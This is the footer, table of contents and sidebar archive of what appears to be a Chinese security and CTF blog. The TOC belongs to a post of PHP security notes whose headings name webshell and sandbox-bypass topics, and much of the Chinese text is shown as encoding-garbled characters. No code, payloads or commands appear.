        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- ä¸è’œå­  -->
    
    <div class="busuanzi-container">
    
     
    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
    
    </div>
    
</footer>
    </div>
    <!-- toc -->
    
    <div class="toc-wrapper" style=
    







top:50vh;

    >
        <div class="toc-catalog">
            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
        </div>
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#php-%E5%AE%89%E5%85%A8%E7%9F%A5%E8%AF%86%E7%82%B9%C2%B7%E6%9D%82%E8%AE%B0%F0%9F%A4%B9%E2%80%8D"><span class="toc-number">1.</span> <span class="toc-text">php-å®‰å…¨çŸ¥è¯†ç‚¹Â·æ‚è®°ğŸ¤¹â€</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php-protocol"><span class="toc-number">1.1.</span> <span class="toc-text">php_protocol</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A7%E7%94%A8%E5%88%A9%E7%94%A8filter"><span class="toc-number">1.1.1.</span> <span class="toc-text">å·§ç”¨åˆ©ç”¨filter</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#compress-bzip2-%E4%B8%8E-phar"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">compress.bzip2:&#x2F;&#x2F;  ä¸ phar:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87die"><span class="toc-number">1.1.2.</span> <span class="toc-text">ç»•è¿‡die</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96"><span class="toc-number">1.1.3.</span> <span class="toc-text">å…¶ä»–</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-%E6%A0%87%E7%AD%BE%E4%B8%8E%E7%89%88%E6%9C%AC%E9%97%AE%E9%A2%98"><span class="toc-number">1.2.</span> <span class="toc-text">php æ ‡ç­¾ä¸ç‰ˆæœ¬é—®é¢˜</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E6%9E%84%E9%80%A0webshell"><span class="toc-number">1.3.</span> <span class="toc-text">ç‰¹æ®Šæ„é€ webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%97%A0%E5%AD%97%E6%AF%8D%E6%9D%A5%E6%9E%84%E9%80%A0webshell"><span class="toc-number">1.3.1.</span> <span class="toc-text">åˆ©ç”¨æ— å­—æ¯æ¥æ„é€ webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%95%B0%E5%AD%A6%E8%AE%A1%E7%AE%97%E7%AC%A6%E5%8F%B7%E6%9D%A5%E6%9E%84%E9%80%A0webshell"><span class="toc-number">1.3.2.</span> <span class="toc-text">åˆ©ç”¨æ•°å­¦è®¡ç®—ç¬¦å·æ¥æ„é€ webshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Parametric-Function-RCE"><span class="toc-number">1.3.3.</span> <span class="toc-text">PHP-Parametric-Function-RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell-%E7%BB%93%E6%9E%84%E4%B8%8E%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98"><span class="toc-number">1.3.4.</span> <span class="toc-text">webshell ç»“æ„ä¸å…¶ä»–é—®é¢˜</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#assert"><span class="toc-number">1.3.4.1.</span> <span class="toc-text"> assert</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-disable-function-%F0%9F%A5%99"><span class="toc-number">1.4.</span> <span class="toc-text">bypass disable_function ğŸ¥™</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-LD-PRELOAD"><span class="toc-number">1.4.1.</span> <span class="toc-text">0x01 LD_PRELOAD</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x0a-%E5%8A%AB%E6%8C%81%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">0x0a åŠ«æŒå‡½æ•°</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x0b-%E5%8A%AB%E6%8C%81%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">0x0b  åŠ«æŒå…±äº«å¯¹è±¡</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x0c-%E5%85%B6%E4%BB%96"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">0x0c å…¶ä»–:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-ShellShock"><span class="toc-number">1.4.2.</span> <span class="toc-text">0x02 ShellShock</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-Apache-Mod-CGI"><span class="toc-number">1.4.3.</span> <span class="toc-text">0x03 Apache Mod CGI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-PHP-FPM"><span class="toc-number">1.4.4.</span> <span class="toc-text">0x04 PHP-FPM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-Json-Serializer-UAF"><span class="toc-number">1.4.5.</span> <span class="toc-text">0x05 Json Serializer UAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-GC-UAF"><span class="toc-number">1.4.6.</span> <span class="toc-text">0x06 GC UAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-Backtrace-UAF"><span class="toc-number">1.4.7.</span> <span class="toc-text">0x07 Backtrace UAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-FFI%E6%89%A9%E5%B1%95"><span class="toc-number">1.4.8.</span> <span class="toc-text">0x08 FFIæ‰©å±•</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass-open-basedir-%F0%9F%8D%94"><span class="toc-number">1.5.</span> <span class="toc-text">bypass open_basedir ğŸ”</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#open-basedir-%E5%AE%98%E6%96%B9%E6%89%8B%E5%86%8C%E4%B8%8A%E7%9A%84%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.5.1.</span> <span class="toc-text">open_basedir å®˜æ–¹æ‰‹å†Œä¸Šçš„æè¿°</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-ini-set"><span class="toc-number">1.5.2.</span> <span class="toc-text">0x01 ini_set()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E5%88%A9%E7%94%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0Bypass"><span class="toc-number">1.5.3.</span> <span class="toc-text">0x02 åˆ©ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°Bypass</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E5%88%A9%E7%94%A8symlink-%E6%9E%84%E9%80%A0%E8%BD%AF%E9%93%BE%E6%8E%A5"><span class="toc-number">1.5.4.</span> <span class="toc-text">0x03 åˆ©ç”¨symlink()æ„é€ è½¯é“¾æ¥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04%E5%88%A9%E7%94%A8glob-%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.5.5.</span> <span class="toc-text">0x04åˆ©ç”¨glob:&#x2F;&#x2F;ä¼ªåè®®</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#0x01-DirectoryIterator-glob"><span class="toc-number">1.5.5.1.</span> <span class="toc-text">0x01 DirectoryIterator+glob:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#0x02-opendir-readdir-glob"><span class="toc-number">1.5.5.2.</span> <span class="toc-text">0x02 opendir()+readdir()+glob:&#x2F;&#x2F;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E5%88%A9%E7%94%A8chdir-%E4%B8%8Eini-set-%E7%BB%84%E5%90%88Bypass"><span class="toc-number">1.5.6.</span> <span class="toc-text">0x05 åˆ©ç”¨chdir()ä¸ini_set()ç»„åˆBypass</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.5.6.1.</span> <span class="toc-text">åŸç†</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-%E5%88%A9%E7%94%A8bindtextdomain"><span class="toc-number">1.5.7.</span> <span class="toc-text">0x06 åˆ©ç”¨bindtextdomain()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-%E5%88%A9%E7%94%A8SplFileInfo-getRealPath-%E7%B1%BB%E6%96%B9%E6%B3%95"><span class="toc-number">1.5.8.</span> <span class="toc-text">0x07 åˆ©ç”¨SplFileInfo::getRealPath()ç±»æ–¹æ³•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x08-realpath"><span class="toc-number">1.5.9.</span> <span class="toc-text">0x08 realpath()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shell-%E8%84%9A%E6%9C%AC"><span class="toc-number">1.6.</span> <span class="toc-text">shell è„šæœ¬</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E8%84%9A%E6%9C%AC"><span class="toc-number">1.6.1.</span> <span class="toc-text">å»¶æ—¶è„šæœ¬</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">2.</span> <span class="toc-text">åè®°</span></a></li></ol>
    </div>
    
    <div class="back-top iconfont-archer">&#xe639;</div>
    <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
          <div class="sidebar-panel-archives">
    <!-- åœ¨ejsä¸­å°†archiveæŒ‰ç…§æ—¶é—´æ’åº -->
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    <div class="total-and-search">
        <div class="total-archive">
        Total : 48
        </div>
        <!-- search  -->
        
    </div>
    
    <div class="post-archive">
    
    
    
    
    <div class="archive-year"> 2021 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2021/03/14/CnHongKe/" >CnHongke</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2021/03/14/MS%2014-068%20&&%20CVE-2020-1472/" >MS 14-068 && CVE-2020-1472</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2021/03/14/Struts2/" >Struts2</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2021/03/14/mySocks/" >Socks5 c/c++ ç¼–å†™</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2021/03/14/Fastjson/" >Fastjson ååºåˆ—åŒ–æ¼æ´å¤ç°</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2021/03/14/Thinkphp/" >THINKPHP æ¼æ´å¤ç°</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2021/03/14/VulnStack-0x02/" >VulnStack_0x02</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2021/03/14/Weblogic/" >WebLogic æ¼æ´å¤ç°</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/2021/03/14/%E9%80%9A%E8%BE%BEOA/" >é€šè¾¾OA</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2020 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/21</span><a class="archive-post-title" href= "/2020/12/21/xctf%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8C%91%E6%88%98%E8%B5%9B-%E5%8D%8E%E4%B8%BA%E4%BA%91%E4%B8%93%E5%9C%BA/" >xctfé«˜æ ¡ç½‘ç»œå®‰å…¨æŒ‘æˆ˜èµ›-åä¸ºäº‘ä¸“åœº</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/25</span><a class="archive-post-title" href= "/2020/11/25/2020-web%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E6%AF%94%E8%B5%9B/" >2020 webå®‰å…¨æµ‹è¯•æ¯”èµ›</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/2020/11/15/2020%E5%B9%B4%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E9%82%80%E8%AF%B7%E8%B5%9B%E6%9A%A8%E7%AC%AC%E5%85%AD%E5%B1%8A%E4%B8%8A%E6%B5%B7%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/" >2020å¹´å…¨å›½å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨é‚€è¯·èµ›æš¨ç¬¬å…­å±Šä¸Šæµ·å¸‚å¤§å­¦ç”Ÿç½‘ç»œå®‰å…¨å¤§èµ›</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/15</span><a class="archive-post-title" href= "/2020/11/15/php_%E5%AE%89%E5%85%A8%E6%9D%82%E8%AE%B0/" >php-å®‰å…¨çŸ¥è¯†ç‚¹Â·æ‚è®°</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/16</span><a class="archive-post-title" href= "/2020/10/16/%E5%A4%A9%E5%88%9B%E6%9D%AF/" >å¤©åˆ›æ¯</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/14</span><a class="archive-post-title" href= "/2020/10/14/%E8%A5%BF%E6%B9%96%E8%A1%80%E8%99%902020/" >è¥¿æ¹–è¡€è™[å¤ç°]</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/30</span><a class="archive-post-title" href= "/2020/09/30/cumtctf2020-Web%E5%87%BA%E9%A2%98/" >cumtctf2020-Webå‡ºé¢˜</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/13</span><a class="archive-post-title" href= "/2020/09/13/PHP-Parser/" >åˆè¯†PHP-Parser</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/12</span><a class="archive-post-title" href= "/2020/09/12/20208%E6%9C%88%E5%88%B09%E6%9C%88%E5%88%9D%E7%9A%84wp%E5%90%88%E9%9B%86/" >20208æœˆåˆ°9æœˆåˆçš„wpåˆé›†</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/26</span><a class="archive-post-title" href= "/2020/07/26/CyBRICS-CTF-2020/" >CyBRICS CTF 2020</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/25</span><a class="archive-post-title" href= "/2020/07/25/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B20200725/" >å®‰æ’æœˆèµ›20200725</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">07/22</span><a class="archive-post-title" href= "/2020/07/22/php-curl%E4%B8%8Edocker-remote-api/" >php_curlä¸docker_remote_api</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">06/18</span><a class="archive-post-title" href= "/2020/06/18/zh3r0ctf_and_hsctf/" >zh3r0ctf_and_hsctf</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/28</span><a class="archive-post-title" href= "/2020/05/28/buuctf-0x02/" >buuctf_0x02</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/10</span><a class="archive-post-title" href= "/2020/05/10/VulnStack-0x01/" >VulnStack_0x01</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/10</span><a class="archive-post-title" href= "/2020/05/10/SQLI%E9%9D%B6%E5%9C%BA/" >SQLI é¶åœº</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">05/05</span><a class="archive-post-title" href= "/2020/05/05/sqli%E4%BB%A3%E7%A0%81%E7%BC%96%E5%86%99%E4%B8%8E%E9%98%B2%E6%8A%A4/" >sqliä»£ç ç¼–å†™ä¸é˜²æŠ¤</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/29</span><a class="archive-post-title" href= "/2020/04/29/upload-labs/" >upload-labs</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/27</span><a class="archive-post-title" href= "/2020/04/27/web_%E5%AE%89%E5%85%A8%E4%B9%8B%E9%A1%B5%E9%9D%A2%E8%A7%A3%E6%9E%90%E7%9A%84%E6%B5%81%E7%A8%8B%E5%AD%A6%E4%B9%A0/" >é¡µé¢è§£æçš„æµç¨‹å­¦ä¹ </a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/26</span><a class="archive-post-title" href= "/2020/04/26/2020-4%E6%AF%94%E8%B5%9B%E4%B8%8E%E5%88%B7%E9%A2%98/" >2020-4ä¸­æ—¬æ¯”èµ›ä¸åˆ·é¢˜</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/23</span><a class="archive-post-title" href= "/2020/04/23/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9B%B8%E5%85%B3%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/" >æ•°æ®åº“ç›¸å…³æ³¨å…¥è¯­å¥çš„æ”¶é›†å’Œå­¦ä¹ </a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/06</span><a class="archive-post-title" href= "/2020/04/06/2020-yctf/" >2020-yctf</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">04/06</span><a class="archive-post-title" href= "/2020/04/06/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8A%9F%E8%83%BD/" >æ•°æ®åº“åŠŸèƒ½</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/30</span><a class="archive-post-title" href= "/2020/03/30/%E7%B3%BB%E7%BB%9F%E8%A1%A8%E5%AD%A6%E4%B9%A0/" >ç³»ç»Ÿè¡¨å­¦ä¹ </a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/23</span><a class="archive-post-title" href= "/2020/03/23/%E8%AE%A4%E8%AF%86%E6%95%B0%E6%8D%AE%E5%BA%93/" >è®¤è¯†æ•°æ®åº“</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">03/16</span><a class="archive-post-title" href= "/2020/03/16/%E6%90%AD%E5%BB%BAweb%E8%BF%90%E8%A1%8C%E7%9A%84%E5%9F%BA%E7%A1%80%E7%8E%AF%E5%A2%83/" >æ­å»ºwebè¿è¡Œçš„åŸºç¡€ç¯å¢ƒ</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">02/25</span><a class="archive-post-title" href= "/2020/02/25/sqli/" >sqli-lab</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/30</span><a class="archive-post-title" href= "/2020/01/30/flask/" >flask</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/10</span><a class="archive-post-title" href= "/2020/01/10/buuctf/" >buuctf_0x01</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">01/07</span><a class="archive-post-title" href= "/2020/01/07/CUMTCTF%E7%AB%9E%E8%B5%9B%E5%B9%B3%E5%8F%B0/" >CUMTCTFç«èµ›å¹³å°</a>
        </li>
    
    
    
    
    
        </ul>
    
    <div class="archive-year"> 2019 </div>
    <ul class="year-list">
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">12/02</span><a class="archive-post-title" href= "/2019/12/02/XSS/" >XSS_20</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/18</span><a class="archive-post-title" href= "/2019/11/18/learngit/" >learngit</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">11/03</span><a class="archive-post-title" href= "/2019/11/03/cumt-bxs/" >cumt_bxs å…¥é—¨ä¸æå‡</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/19</span><a class="archive-post-title" href= "/2019/10/19/article/" >å›é¡¾ä¸åçœ</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">10/07</span><a class="archive-post-title" href= "/2019/10/07/injection/" >injection</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/28</span><a class="archive-post-title" href= "/2019/09/28/CUMTCTF2019-FINAL/" >CUMTCTF2019-FINAL</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/23</span><a class="archive-post-title" href= "/2019/09/23/9-20/" >9-20  wp   æ…¢æ…¢å‰è¡Œ</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/18</span><a class="archive-post-title" href= "/2019/09/18/future/" >é¢å¯¹æœªæ¥</a>
        </li>
    
    
        <li class="archive-post-item">
            <span class="archive-post-date">09/17</span><a class="archive-post-title" href= "/2019/09/17/hackme%20wp%20%20%E5%BE%85%E7%BB%AD/" >hackme wp å¾…ç»­</a>
        </li>
    
    </div>
  </div>
        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
    
        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
    
        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
    
        <span class="sidebar-tag-name" data-tags="sql-injection"><span class="iconfont-archer">&#xe606;</span>sql-injection</span>
    
        <span class="sidebar-tag-name" data-tags="ssti"><span class="iconfont-archer">&#xe606;</span>ssti</span>
    
        <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
    
        <span class="sidebar-tag-name" data-tags="cumt"><span class="iconfont-archer">&#xe606;</span>cumt</span>
    
        <span class="sidebar-tag-name" data-tags="misc"><span class="iconfont-archer">&#xe606;</span>misc</span>
    
        <span class="sidebar-tag-name" data-tags="Windows"><span class="iconfont-archer">&#xe606;</span>Windows</span>
    
        <span class="sidebar-tag-name" data-tags="PHP-Parser"><span class="iconfont-archer">&#xe606;</span>PHP-Parser</span>
    
        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
    
        <span class="sidebar-tag-name" data-tags="Struts2"><span class="iconfont-archer">&#xe606;</span>Struts2</span>
    
        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
    
        <span class="sidebar-tag-name" data-tags="labs"><span class="iconfont-archer">&#xe606;</span>labs</span>
    
        <span class="sidebar-tag-name" data-tags="life"><span class="iconfont-archer">&#xe606;</span>life</span>
    
        <span class="sidebar-tag-name" data-tags="crypto"><span class="iconfont-archer">&#xe606;</span>crypto</span>
    
        <span class="sidebar-tag-name" data-tags="flask"><span class="iconfont-archer">&#xe606;</span>flask</span>
    
        <span class="sidebar-tag-name" data-tags="git"><span class="iconfont-archer">&#xe606;</span>git</span>
    
        <span class="sidebar-tag-name" data-tags="Socks"><span class="iconfont-archer">&#xe606;</span>Socks</span>
    
        <span class="sidebar-tag-name" data-tags="Tools"><span class="iconfont-archer">&#xe606;</span>Tools</span>
    
        <span class="sidebar-tag-name" data-tags="c/c++"><span class="iconfont-archer">&#xe606;</span>c/c++</span>
    
        <span class="sidebar-tag-name" data-tags="æµé‡åˆ†æ"><span class="iconfont-archer">&#xe606;</span>æµé‡åˆ†æ</span>
    
        <span class="sidebar-tag-name" data-tags="mysql udf"><span class="iconfont-archer">&#xe606;</span>mysql udf</span>
    
        <span class="sidebar-tag-name" data-tags="ä¿¡å®‰ä¹‹è·¯"><span class="iconfont-archer">&#xe606;</span>ä¿¡å®‰ä¹‹è·¯</span>
    
        <span class="sidebar-tag-name" data-tags="mysql"><span class="iconfont-archer">&#xe606;</span>mysql</span>
    
        <span class="sidebar-tag-name" data-tags="fastjson"><span class="iconfont-archer">&#xe606;</span>fastjson</span>
    
        <span class="sidebar-tag-name" data-tags="å†…ç½‘æ¸—é€"><span class="iconfont-archer">&#xe606;</span>å†…ç½‘æ¸—é€</span>
    
        <span class="sidebar-tag-name" data-tags="çº¢æ—¥é¶åœº"><span class="iconfont-archer">&#xe606;</span>çº¢æ—¥é¶åœº</span>
    
        <span class="sidebar-tag-name" data-tags="thinkphp"><span class="iconfont-archer">&#xe606;</span>thinkphp</span>
    
        <span class="sidebar-tag-name" data-tags="buuctf"><span class="iconfont-archer">&#xe606;</span>buuctf</span>
    
        <span class="sidebar-tag-name" data-tags="docker"><span class="iconfont-archer">&#xe606;</span>docker</span>
    
        <span class="sidebar-tag-name" data-tags="curl"><span class="iconfont-archer">&#xe606;</span>curl</span>
    
        <span class="sidebar-tag-name" data-tags="weblogic"><span class="iconfont-archer">&#xe606;</span>weblogic</span>
    
        <span class="sidebar-tag-name" data-tags="WEBç¯å¢ƒæ­å»º"><span class="iconfont-archer">&#xe606;</span>WEBç¯å¢ƒæ­å»º</span>
    
        <span class="sidebar-tag-name" data-tags="é€šè¾¾OA"><span class="iconfont-archer">&#xe606;</span>é€šè¾¾OA</span>
    
        <span class="sidebar-tag-name" data-tags="bypass_open_basedir"><span class="iconfont-archer">&#xe606;</span>bypass_open_basedir</span>
    
        <span class="sidebar-tag-name" data-tags="bypass_disable_function"><span class="iconfont-archer">&#xe606;</span>bypass_disable_function</span>
    
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
